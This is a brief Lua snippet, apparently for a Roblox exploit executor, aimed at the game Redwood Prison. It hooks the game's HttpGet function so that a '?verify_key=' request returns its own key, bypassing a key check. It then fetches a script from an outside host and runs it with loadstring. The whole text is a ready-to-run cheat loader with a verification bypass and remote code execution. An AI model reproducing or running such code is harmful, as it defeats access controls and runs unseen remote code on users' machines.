local old
old = hookfunction(game.HttpGet, function(a,b,...)
   local _, nd = b:find("?verify_key=")
   if nd then
       return b:sub(nd+1)
   end
   return old(a,b,...)
end)
loadstring(game:HttpGet('https://blackballhost.xyz/s/redwood-prison-v2.lua'))()